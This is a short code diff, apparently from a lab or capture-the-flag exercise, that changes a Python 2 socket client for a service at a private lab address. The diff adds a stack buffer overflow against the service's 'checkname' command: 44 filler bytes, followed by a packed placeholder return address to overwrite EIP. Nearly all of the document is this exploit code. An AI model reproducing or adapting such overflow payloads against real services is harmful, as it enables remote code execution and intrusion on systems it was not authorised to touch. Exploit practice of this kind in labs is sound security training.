@@ -11,8 +11,8 @@ def addReg(s, name, ipv4):
 def get(s):
 	print s.recv(1024)
 
-def checkname():
-	print "What"
+def checkname(s, overflow):
+	s.sendall("checkname " + str(overflow) ) #When the name >32 char
 
 def isUp(port):
 	s.sendall("isup "+ "junk "+ str(port) +" \n")
@@ -22,8 +22,12 @@ def main(s):
 	myPort = "9000"
 	get(s)
 	#addReg(s, "iamalongaddress" ,"192.168.72.145")
-	sendDb(s, myAddr, myPort)
+	#sendDb(s, myAddr, myPort)
 	#isUp(9000)
+	overflow = "A"*44 #Control of EBP, ESI, EDI
+	EIP = struct.pack("<I",0xdeadbeef)
+	sendString = overflow+EIP
+	checkname(s, sendString)
 
 s = socket.socket()
 s.connect(("192.168.72.134",20005)) 
